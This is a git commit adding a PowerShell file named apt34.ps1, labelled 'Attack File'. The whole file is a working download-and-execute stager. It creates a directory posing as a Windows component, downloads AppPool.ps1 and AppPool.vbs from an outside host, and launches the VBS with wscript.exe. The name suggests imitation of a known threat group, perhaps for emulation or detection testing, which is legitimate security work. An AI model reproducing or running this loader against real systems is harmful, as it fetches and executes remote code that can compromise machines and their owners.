224e4aaeef4d404aa1a0688aac781075290c3ec5
AleBElastic <58422006+AleBElastic@users.noreply.github.com>
2020-06-10 17:36:58 +0200

    Attack File

---
+++ apt34.ps1
@@ -0,0 +1,13 @@
+﻿
+    $SrcUri = "https://images.swiftcrypto.com/"
+    $HomeDir = "C:\ProgramData\WindowsAppPool\"
+    New-Item -Path $HomeDir -Type directory
+
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-WebRequest -Uri "$SrcUri/AppPool.ps1" -OutFile "$HomeDir\AppPool.ps1"
+    Invoke-WebRequest -Uri "$SrcUri/AppPool.vbs" -OutFile "$HomeDir\AppPool.vbs"
+
+    $Arguments = $("$HomeDir\AppPool.vbs")
+    Start-Process "wscript.exe" -ArgumentList $Arguments -Wait -NoNewWindow
+    
+
